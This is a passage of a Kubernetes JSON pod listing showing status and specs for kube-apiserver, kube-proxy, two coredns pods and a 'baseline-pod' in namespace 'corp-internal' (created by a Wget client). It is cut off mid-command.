scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"readinessProbe":{"httpGet":{"path":"/readyz","port":6443,"host":"192.168.213.128","scheme":"HTTPS"},"timeoutSeconds":15,"periodSeconds":1,"successThreshold":1,"failureThreshold":3},"startupProbe":{"httpGet":{"path":"/livez","port":6443,"host":"192.168.213.128","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"longth-cluster","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","priority":2000001000,"enableServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:57Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:16Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:16Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2026-03-30T02:04:56Z","containerStatuses":[{"name":"kube-apiserver","state":{"running":{"startedAt":"2026-03-30T02:04:57Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:14Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://4222258eca6dd81df89ee55bf68d560f27f316f0fcd25ae5255f37be43971668"}},"ready":true,"restartCount":3,"image":"registry.k8s.io/kube-apiserver:v1.31.13","imageID":"registry.k8s.io/kube-apiserver@sha256:9abeb8a2d3e53e356d1f2e5d5dc2081cf28f23242651b0552c9e38f4a7ae960e","containerID":"containerd://ea54662f3110dfec3925f5f930a04969348b7f07a497aa6ad96a65f3fccb6266","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"kube-proxy-2846r","generateName":"kube-proxy-","namespace":"kube-system","uid":"eacdbfcf-4701-4c7a-b29a-1e041373fb8a","resourceVersion":"371494","creationTimestamp":"2025-09-23T07:44:00Z","labels":{"controller-revision-hash":"f95ff75fc","k8s-app":"kube-proxy","pod-template-generation":"1"},"annotations":{"kubernetes.io/config.seen":"2026-03-30T02:05:02.211827764Z","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"DaemonSet","name":"kube-proxy","uid":"bba73e16-ac79-40eb-bd50-ea0ccaeedd31","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2025-09-23T07:44:00Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:controller-revision-hash":{},"f:k8s-app":{},"f:pod-template-generation":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"bba73e16-ac79-40eb-bd50-ea0ccaeedd31\"}":{}}},"f:spec":{"f:affinity":{".":{},"f:nodeAffinity":{".":{},"f:requiredDuringSchedulingIgnoredDuringExecution":{}}},"f:containers":{"k:{\"name\":\"kube-proxy\"}":{".":{},"f:command":{},"f:env":{".":{},"k:{\"name\":\"NODE_NAME\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}}},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:securityContext":{".":{},"f:privileged":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/lib/modules\"}":{".":{},"f:mountPath":{},"f:name":{},"f:readOnly":{}},"k:{\"mountPath\":\"/run/xtables.lock\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/lib/kube-proxy\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:hostNetwork":{},"f:nodeSelector":{},"f:priorityClassName":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:tolerations":{},"f:volumes":{".":{},"k:{\"name\":\"kube-proxy\"}":{".":{},"f:configMap":{".":{},"f:defaultMode":{},"f:name":{}},"f:name":{}},"k:{\"name\":\"lib-modules\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"xtables-lock\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T06:57:22Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"192.168.213.128\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"kube-proxy","configMap":{"name":"kube-proxy","defaultMode":420}},{"name":"xtables-lock","hostPath":{"path":"/run/xtables.lock","type":"FileOrCreate"}},{"name":"lib-modules","hostPath":{"path":"/lib/modules","type":""}},{"name":"kube-api-access-4thzp","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"kube-proxy","image":"registry.k8s.io/kube-proxy:v1.31.13","command":["/usr/local/bin/kube-proxy","--config=/var/lib/kube-proxy/config.conf","--hostname-override=$(NODE_NAME)"],"env":[{"name":"NODE_NAME","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"spec.nodeName"}}}],"resources":{},"volumeMounts":[{"name":"kube-proxy","mountPath":"/var/lib/kube-proxy"},{"name":"xtables-lock","mountPath":"/run/xtables.lock"},{"name":"lib-modules","readOnly":true,"mountPath":"/lib/modules"},{"name":"kube-api-access-4thzp","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeSelector":{"kubernetes.io/os":"linux"},"serviceAccountName":"kube-proxy","serviceAccount":"kube-proxy","nodeName":"longth-cluster","hostNetwork":true,"securityContext":{},"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchFields":[{"key":"metadata.name","operator":"In","values":["longth-cluster"]}]}]}}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists"},{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/disk-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/memory-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/pid-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/unschedulable","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/network-unavailable","operator":"Exists","effect":"NoSchedule"}],"priorityClassName":"system-node-critical","priority":2000001000,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:03Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:44:00Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:03Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:03Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:44:00Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2025-09-23T07:44:00Z","containerStatuses":[{"name":"kube-proxy","state":{"running":{"startedAt":"2026-03-30T02:05:03Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:21Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://61f20b15bc7da897f4bc239060b01370bb5ab4f15fd2fa0e2033c93ca9f38035"}},"ready":true,"restartCount":48,"image":"registry.k8s.io/kube-proxy:v1.31.13","imageID":"registry.k8s.io/kube-proxy@sha256:a39637326e88d128d38da6ff2b2ceb4e856475887bfcb5f7a55734d4f63d9fae","containerID":"containerd://4cc662543c3fd27a579500d1ea16f5bbe38c2ee333c544f90100c4ec9163aeb8","started":true,"volumeMounts":[{"name":"kube-proxy","mountPath":"/var/lib/kube-proxy"},{"name":"xtables-lock","mountPath":"/run/xtables.lock"},{"name":"lib-modules","mountPath":"/lib/modules","readOnly":true,"recursiveReadOnly":"Disabled"},{"name":"kube-api-access-4thzp","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"BestEffort"}},{"metadata":{"name":"coredns-7c65d6cfc9-55dcz","generateName":"coredns-7c65d6cfc9-","namespace":"kube-system","uid":"77f78a1a-3be2-4bd4-b712-e18e47ad3c8d","resourceVersion":"371600","creationTimestamp":"2025-09-23T07:44:01Z","labels":{"k8s-app":"kube-dns","pod-template-hash":"7c65d6cfc9"},"annotations":{"kubernetes.io/config.seen":"2026-03-30T02:05:02.211820456Z","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"ReplicaSet","name":"coredns-7c65d6cfc9","uid":"17661fa1-c283-4678-bd16-2d5633325b70","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2025-09-23T07:44:01Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:k8s-app":{},"f:pod-template-hash":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"17661fa1-c283-4678-bd16-2d5633325b70\"}":{}}},"f:spec":{"f:affinity":{".":{},"f:podAntiAffinity":{".":{},"f:preferredDuringSchedulingIgnoredDuringExecution":{}}},"f:containers":{"k:{\"name\":\"coredns\"}":{".":{},"f:args":{},"f:image":{},"f:imagePullPolicy":{},"f:livenessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:initialDelaySeconds":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":53,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}},"k:{\"containerPort\":53,\"protocol\":\"UDP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}},"k:{\"containerPort\":9153,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}}},"f:readinessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:resources":{".":{},"f:limits":{".":{},"f:memory":{}},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:securityContext":{".":{},"f:allowPrivilegeEscalation":{},"f:capabilities":{".":{},"f:add":{},"f:drop":{}},"f:readOnlyRootFilesystem":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/etc/coredns\"}":{".":{},"f:mountPath":{},"f:name":{},"f:readOnly":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:nodeSelector":{},"f:priorityClassName":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:tolerations":{},"f:volumes":{".":{},"k:{\"name\":\"config-volume\"}":{".":{},"f:configMap":{".":{},"f:defaultMode":{},"f:items":{},"f:name":{}},"f:name":{}}}}}},{"manager":"kube-scheduler","operation":"Update","apiVersion":"v1","time":"2025-09-23T07:44:01Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{".":{},"k:{\"type\":\"PodScheduled\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:message":{},"f:reason":{},"f:status":{},"f:type":{}}}}},"subresource":"status"},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T06:57:31Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"10.244.0.164\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"config-volume","configMap":{"name":"coredns","items":[{"key":"Corefile","path":"Corefile"}],"defaultMode":420}},{"name":"kube-api-access-dtcxk","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"coredns","image":"registry.k8s.io/coredns/coredns:v1.11.3","args":["-conf","/etc/coredns/Corefile"],"ports":[{"name":"dns","containerPort":53,"protocol":"UDP"},{"name":"dns-tcp","containerPort":53,"protocol":"TCP"},{"name":"metrics","containerPort":9153,"protocol":"TCP"}],"resources":{"limits":{"memory":"170Mi"},"requests":{"cpu":"100m","memory":"70Mi"}},"volumeMounts":[{"name":"config-volume","readOnly":true,"mountPath":"/etc/coredns"},{"name":"kube-api-access-dtcxk","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"livenessProbe":{"httpGet":{"path":"/health","port":8080,"scheme":"HTTP"},"initialDelaySeconds":60,"timeoutSeconds":5,"periodSeconds":10,"successThreshold":1,"failureThreshold":5},"readinessProbe":{"httpGet":{"path":"/ready","port":8181,"scheme":"HTTP"},"timeoutSeconds":1,"periodSeconds":10,"successThreshold":1,"failureThreshold":3},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"add":["NET_BIND_SERVICE"],"drop":["ALL"]},"readOnlyRootFilesystem":true,"allowPrivilegeEscalation":false}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"Default","nodeSelector":{"kubernetes.io/os":"linux"},"serviceAccountName":"coredns","serviceAccount":"coredns","nodeName":"longth-cluster","securityContext":{},"affinity":{"podAntiAffinity":{"preferredDuringSchedulingIgnoredDuringExecution":[{"weight":100,"podAffinityTerm":{"labelSelector":{"matchExpressions":[{"key":"k8s-app","operator":"In","values":["kube-dns"]}]},"topologyKey":"kubernetes.io/hostname"}}]}},"schedulerName":"default-scheduler","tolerations":[{"key":"CriticalAddonsOnly","operator":"Exists"},{"key":"node-role.kubernetes.io/control-plane","effect":"NoSchedule"},{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priorityClassName":"system-cluster-critical","priority":2000000000,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:08Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:49:12Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:08Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:08Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:49:12Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"10.244.0.179","podIPs":[{"ip":"10.244.0.179"}],"startTime":"2025-09-23T07:49:12Z","containerStatuses":[{"name":"coredns","state":{"running":{"startedAt":"2026-03-30T02:05:07Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:30Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://df3c9a72363ffc74eabf4f43b1cb036c1a9539a27f725e4ba6ba19145f59086a"}},"ready":true,"restartCount":48,"image":"registry.k8s.io/coredns/coredns:v1.11.3","imageID":"registry.k8s.io/coredns/coredns@sha256:9caabbf6238b189a65d0d6e6ac138de60d6a1c419e5a341fbbb7c78382559c6e","containerID":"containerd://0e5e945128771226e52efa7936f3dd8497b9e3335b053d8ffe74d654b0a74a3e","started":true,"volumeMounts":[{"name":"config-volume","mountPath":"/etc/coredns","readOnly":true,"recursiveReadOnly":"Disabled"},{"name":"kube-api-access-dtcxk","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"Burstable"}},{"metadata":{"name":"coredns-7c65d6cfc9-rs26z","generateName":"coredns-7c65d6cfc9-","namespace":"kube-system","uid":"ec6030be-90c0-4d7b-a1b4-567e3d712d45","resourceVersion":"371585","creationTimestamp":"2025-09-23T07:44:01Z","labels":{"k8s-app":"kube-dns","pod-template-hash":"7c65d6cfc9"},"annotations":{"kubernetes.io/config.seen":"2026-03-30T02:05:02.211831735Z","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"ReplicaSet","name":"coredns-7c65d6cfc9","uid":"17661fa1-c283-4678-bd16-2d5633325b70","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2025-09-23T07:44:01Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:k8s-app":{},"f:pod-template-hash":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"17661fa1-c283-4678-bd16-2d5633325b70\"}":{}}},"f:spec":{"f:affinity":{".":{},"f:podAntiAffinity":{".":{},"f:preferredDuringSchedulingIgnoredDuringExecution":{}}},"f:containers":{"k:{\"name\":\"coredns\"}":{".":{},"f:args":{},"f:image":{},"f:imagePullPolicy":{},"f:livenessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:initialDelaySeconds":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":53,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}},"k:{\"containerPort\":53,\"protocol\":\"UDP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}},"k:{\"containerPort\":9153,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}}},"f:readinessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:resources":{".":{},"f:limits":{".":{},"f:memory":{}},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:securityContext":{".":{},"f:allowPrivilegeEscalation":{},"f:capabilities":{".":{},"f:add":{},"f:drop":{}},"f:readOnlyRootFilesystem":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/etc/coredns\"}":{".":{},"f:mountPath":{},"f:name":{},"f:readOnly":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:nodeSelector":{},"f:priorityClassName":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:tolerations":{},"f:volumes":{".":{},"k:{\"name\":\"config-volume\"}":{".":{},"f:configMap":{".":{},"f:defaultMode":{},"f:items":{},"f:name":{}},"f:name":{}}}}}},{"manager":"kube-scheduler","operation":"Update","apiVersion":"v1","time":"2025-09-23T07:44:01Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{".":{},"k:{\"type\":\"PodScheduled\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:message":{},"f:reason":{},"f:status":{},"f:type":{}}}}},"subresource":"status"},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T06:57:28Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"10.244.0.163\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"config-volume","configMap":{"name":"coredns","items":[{"key":"Corefile","path":"Corefile"}],"defaultMode":420}},{"name":"kube-api-access-gms8m","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"coredns","image":"registry.k8s.io/coredns/coredns:v1.11.3","args":["-conf","/etc/coredns/Corefile"],"ports":[{"name":"dns","containerPort":53,"protocol":"UDP"},{"name":"dns-tcp","containerPort":53,"protocol":"TCP"},{"name":"metrics","containerPort":9153,"protocol":"TCP"}],"resources":{"limits":{"memory":"170Mi"},"requests":{"cpu":"100m","memory":"70Mi"}},"volumeMounts":[{"name":"config-volume","readOnly":true,"mountPath":"/etc/coredns"},{"name":"kube-api-access-gms8m","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"livenessProbe":{"httpGet":{"path":"/health","port":8080,"scheme":"HTTP"},"initialDelaySeconds":60,"timeoutSeconds":5,"periodSeconds":10,"successThreshold":1,"failureThreshold":5},"readinessProbe":{"httpGet":{"path":"/ready","port":8181,"scheme":"HTTP"},"timeoutSeconds":1,"periodSeconds":10,"successThreshold":1,"failureThreshold":3},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"add":["NET_BIND_SERVICE"],"drop":["ALL"]},"readOnlyRootFilesystem":true,"allowPrivilegeEscalation":false}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"Default","nodeSelector":{"kubernetes.io/os":"linux"},"serviceAccountName":"coredns","serviceAccount":"coredns","nodeName":"longth-cluster","securityContext":{},"affinity":{"podAntiAffinity":{"preferredDuringSchedulingIgnoredDuringExecution":[{"weight":100,"podAffinityTerm":{"labelSelector":{"matchExpressions":[{"key":"k8s-app","operator":"In","values":["kube-dns"]}]},"topologyKey":"kubernetes.io/hostname"}}]}},"schedulerName":"default-scheduler","tolerations":[{"key":"CriticalAddonsOnly","operator":"Exists"},{"key":"node-role.kubernetes.io/control-plane","effect":"NoSchedule"},{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priorityClassName":"system-cluster-critical","priority":2000000000,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:12Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:49:12Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:12Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:12Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:49:12Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"10.244.0.180","podIPs":[{"ip":"10.244.0.180"}],"startTime":"2025-09-23T07:49:12Z","containerStatuses":[{"name":"coredns","state":{"running":{"startedAt":"2026-03-30T02:05:11Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:27Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://735bbe382d1d794f103d7bf1314f2820f67a1b98b05a1a89a9c7f94631ba2b81"}},"ready":true,"restartCount":48,"image":"registry.k8s.io/coredns/coredns:v1.11.3","imageID":"registry.k8s.io/coredns/coredns@sha256:9caabbf6238b189a65d0d6e6ac138de60d6a1c419e5a341fbbb7c78382559c6e","containerID":"containerd://a3074e91d30597f154d0d810a5268a670c0ecefb242e9845213869b89d775cc1","started":true,"volumeMounts":[{"name":"config-volume","mountPath":"/etc/coredns","readOnly":true,"recursiveReadOnly":"Disabled"},{"name":"kube-api-access-gms8m","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"Burstable"}},{"metadata":{"name":"baseline-pod","namespace":"corp-internal","uid":"db72da89-c988-49d7-a7ed-1877631406e9","resourceVersion":"387762","creationTimestamp":"2026-03-30T03:48:16Z","annotations":{"kubernetes.io/config.seen":"2026-03-30T03:48:16.399517200Z","kubernetes.io/config.source":"api"},"managedFields":[{"manager":"Wget","operation":"Update","apiVersion":"v1","time":"2026-03-30T03:48:16Z","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{"f:containers":{"k:{\"name\":\"shell\"}":{".":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:securityContext":{".":{},"f:allowPrivilegeEscalation":{},"f:capabilities":{".":{},"f:drop":{}}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{}}}}]},"spec":{"volumes":[{"name":"kube-api-access-k28j2","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"shell","image":"alpine:latest","command":["/bin/sh","-c","sleep 